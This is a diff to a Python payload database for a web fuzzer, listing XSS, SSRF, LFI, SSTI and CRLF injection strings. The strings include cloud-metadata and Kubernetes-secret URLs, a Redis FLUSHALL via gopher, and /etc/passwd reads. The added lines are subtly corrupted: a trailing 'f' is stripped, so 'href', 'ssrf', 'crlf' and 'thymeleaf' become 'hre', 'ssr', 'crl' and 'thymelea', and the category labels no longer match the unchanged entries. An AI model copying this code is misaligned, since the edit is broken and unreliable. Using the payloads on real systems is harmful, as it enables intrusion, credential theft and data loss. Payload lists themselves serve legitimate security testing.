@@ -18,7 +18,6 @@ New classes added: PayloadDatabase, GrammarFuzzer, ContextualMutator, SmartPaylo
 from __future__ import annotations
 
 import random
-import string
 import urllib.parse
 from dataclasses import dataclass, field
 from typing import Dict, Iterable, List, Optional, Sequence, Tuple
@@ -148,9 +147,9 @@ XSS_PAYLOADS: List[PayloadEntry] = [
     ("xss_audio_src", "xss", "<audio src=x onerror=alert(1)>", ("html", "body")),
     ("xss_object_data", "xss", "<object data=javascript:alert(1)>", ("html", "body")),
     ("xss_embed_src", "xss", "<embed src=javascript:alert(1)>", ("html", "body")),
-    ("xss_javascript_uri", "xss", "javascript:alert(1)", ("attr", "href", "src", "url")),
-    ("xss_vbscript_uri", "xss", "vbscript:msgbox(1)", ("attr", "href", "url")),
-    ("xss_data_uri", "xss", "data:text/html,<script>alert(1)</script>", ("attr", "href", "url")),
+    ("xss_javascript_uri", "xss", "javascript:alert(1)", ("attr", "hre", "src", "url")),
+    ("xss_vbscript_uri", "xss", "vbscript:msgbox(1)", ("attr", "hre", "url")),
+    ("xss_data_uri", "xss", "data:text/html,<script>alert(1)</script>", ("attr", "hre", "url")),
     ("xss_marquee", "xss", "<marquee onstart=alert(1)>", ("html", "body")),
     ("xss_style", "xss", "<style>@import 'javascript:alert(1)';</style>", ("html", "body")),
     (
@@ -213,9 +212,9 @@ SQLI_PAYLOADS: List[PayloadEntry] = [
 ]
 
 SSRF_PAYLOADS: List[PayloadEntry] = [
-    ("ssrf_localhost", "ssrf", "http://127.0.0.1/", ("http", "url")),
-    ("ssrf_localhost_alt", "ssrf", "http://localhost/", ("http", "url")),
-    ("ssrf_zero_ip", "ssrf", "http://0/", ("http", "url", "waf-bypass")),
+    ("ssrf_localhost", "ssr", "http://127.0.0.1/", ("http", "url")),
+    ("ssrf_localhost_alt", "ssr", "http://localhost/", ("http", "url")),
+    ("ssrf_zero_ip", "ssr", "http://0/", ("http", "url", "waf-bypass")),
     (
         "ssrf_aws_metadata",
         "ssrf",
@@ -258,23 +257,23 @@ SSRF_PAYLOADS: List[PayloadEntry] = [
         "https://example.com/redirect?url=http://169.254.169.254/",
         ("redirect",),
     ),
-    ("ssrf_file_proto", "ssrf", "file:///etc/passwd", ("file", "protocol")),
-    ("ssrf_gopher", "ssrf", "gopher://127.0.0.1:6379/_FLUSHALL", ("gopher", "redis")),
-    ("ssrf_dict", "ssrf", "dict://127.0.0.1:6379/INFO", ("dict", "redis")),
-    ("ssrf_netdoc", "ssrf", "netdoc:///etc/passwd", ("netdoc", "java")),
-    ("ssrf_java_url", "ssrf", "jar:http://127.0.0.1/!/etc/passwd", ("jar", "java")),
-    ("ssrf_ipv6_localhost", "ssrf", "http://[::1]/", ("http", "ipv6")),
-    ("ssrf_dns_rebind", "ssrf", "http://7f000001.c0a80001.rbndr.us/", ("dns-rebind",)),
-    ("ssrf_decimal_ip", "ssrf", "http://2130706433/", ("http", "decimal-ip")),
-    ("ssrf_octal_ip", "ssrf", "http://0177.0.0.1/", ("http", "octal-ip")),
-    ("ssrf_hex_ip", "ssrf", "http://0x7f.0x0.0x0.0x1/", ("http", "hex-ip")),
+    ("ssrf_file_proto", "ssr", "file:///etc/passwd", ("file", "protocol")),
+    ("ssrf_gopher", "ssr", "gopher://127.0.0.1:6379/_FLUSHALL", ("gopher", "redis")),
+    ("ssrf_dict", "ssr", "dict://127.0.0.1:6379/INFO", ("dict", "redis")),
+    ("ssrf_netdoc", "ssr", "netdoc:///etc/passwd", ("netdoc", "java")),
+    ("ssrf_java_url", "ssr", "jar:http://127.0.0.1/!/etc/passwd", ("jar", "java")),
+    ("ssrf_ipv6_localhost", "ssr", "http://[::1]/", ("http", "ipv6")),
+    ("ssrf_dns_rebind", "ssr", "http://7f000001.c0a80001.rbndr.us/", ("dns-rebind",)),
+    ("ssrf_decimal_ip", "ssr", "http://2130706433/", ("http", "decimal-ip")),
+    ("ssrf_octal_ip", "ssr", "http://0177.0.0.1/", ("http", "octal-ip")),
+    ("ssrf_hex_ip", "ssr", "http://0x7f.0x0.0x0.0x1/", ("http", "hex-ip")),
 ]
 
 LFI_PAYLOADS: List[PayloadEntry] = [
     ("lfi_etc_passwd", "lfi", "../../../../etc/passwd", ("path",)),
     ("lfi_etc_passwd_abs", "lfi", "/etc/passwd", ("path", "abs")),
     ("lfi_windows", "lfi", "..\\..\\..\\..\\windows\\win.ini", ("path", "windows")),
-    ("lfi_proc_self", "lfi", "/proc/self/environ", ("path", "linux")),
+    ("lfi_proc_sel", "lfi", "/proc/self/environ", ("path", "linux")),
     ("lfi_null_byte", "lfi", "../../../../etc/passwd%00", ("path", "null-byte", "old-php")),
     (
         "lfi_php_filter",
@@ -492,26 +491,26 @@ SSRF_EXTRA_PAYLOADS: List[PayloadEntry] = [
         "http://169.254.169.254/latest/dynamic/instance-identity/document",
         ("cloud", "aws", "iam"),
     ),
-    ("ssrf_aws_network", "ssrf", "http://169.254.169.254/latest/network/", ("cloud", "aws")),
+    ("ssrf_aws_network", "ssr", "http://169.254.169.254/latest/network/", ("cloud", "aws")),
     (
         "ssrf_aws_hostname",
         "ssrf",
         "http://169.254.169.254/latest/meta-data/hostname",
         ("cloud", "aws"),
     ),
-    ("ssrf_alibaba", "ssrf", "http://100.100.100.200/latest/meta-data/", ("cloud", "alibaba")),
-    ("ssrf_oracle_cloud", "ssrf", "http://192.0.0.192/latest/user-data/", ("cloud", "oracle")),
-    ("ssrf_ecs_task", "ssrf", "http://169.254.170.2/v2/credentials/", ("cloud", "ecs")),
-    ("ssrf_k8s_api", "ssrf", "https://kubernetes.default.svc/api/v1/namespaces", ("cloud", "k8s")),
-    ("ssrf_k8s_secrets", "ssrf", "https://kubernetes.default.svc/api/v1/secrets", ("cloud", "k8s")),
+    ("ssrf_alibaba", "ssr", "http://100.100.100.200/latest/meta-data/", ("cloud", "alibaba")),
+    ("ssrf_oracle_cloud", "ssr", "http://192.0.0.192/latest/user-data/", ("cloud", "oracle")),
+    ("ssrf_ecs_task", "ssr", "http://169.254.170.2/v2/credentials/", ("cloud", "ecs")),
+    ("ssrf_k8s_api", "ssr", "https://kubernetes.default.svc/api/v1/namespaces", ("cloud", "k8s")),
+    ("ssrf_k8s_secrets", "ssr", "https://kubernetes.default.svc/api/v1/secrets", ("cloud", "k8s")),
     (
         "ssrf_internal_scheme",
         "ssrf",
         "gopher://internal.svc:80/_GET /secret HTTP/1.0",
         ("gopher", "internal"),
     ),
-    ("ssrf_ftp", "ssrf", "ftp://127.0.0.1/", ("ftp",)),
-    ("ssrf_tftp", "ssrf", "tftp://127.0.0.1/", ("tftp",)),
+    ("ssrf_ftp", "ssr", "ftp://127.0.0.1/", ("ftp",)),
+    ("ssrf_tftp", "ssr", "tftp://127.0.0.1/", ("tftp",)),
 ]
 
 # SSTI (Server-Side Template Injection)
@@ -528,7 +527,7 @@ SSTI_PAYLOADS: List[PayloadEntry] = [
     ("ssti_smarty_basic", "ssti", "{php}system('id');{/php}", ("template", "smarty", "php")),
     ("ssti_freemarker", "ssti", "${7*7}", ("template", "freemarker", "java")),
     ("ssti_velocity", "ssti", "#set($x=7*7)$x", ("template", "velocity", "java")),
-    ("ssti_thymeleaf", "ssti", "${7*7}", ("template", "thymeleaf", "java")),
+    ("ssti_thymelea", "ssti", "${7*7}", ("template", "thymelea", "java")),
     (
         "ssti_handlebars",
         "ssti",
@@ -550,10 +549,10 @@ NOSQL_PAYLOADS: List[PayloadEntry] = [
 
 # CRLF / header injection
 CRLF_PAYLOADS: List[PayloadEntry] = [
-    ("crlf_basic", "crlf", "value%0d%0aSet-Cookie:%20a=b", ("http",)),
-    ("crlf_lf", "crlf", "value%0aSet-Cookie:%20a=b", ("http",)),
-    ("crlf_null", "crlf", "value%00Set-Cookie:%20a=b", ("http",)),
-    ("crlf_xss", "crlf", "value%0d%0a%0d%0a<script>alert(1)</script>", ("http", "xss")),
+    ("crlf_basic", "crl", "value%0d%0aSet-Cookie:%20a=b", ("http",)),
+    ("crlf_l", "crl", "value%0aSet-Cookie:%20a=b", ("http",)),
+    ("crlf_null", "crl", "value%00Set-Cookie:%20a=b", ("http",)),
+    ("crlf_xss", "crl", "value%0d%0a%0d%0a<script>alert(1)</script>", ("http", "xss")),
 ]
 
 # Deserialization
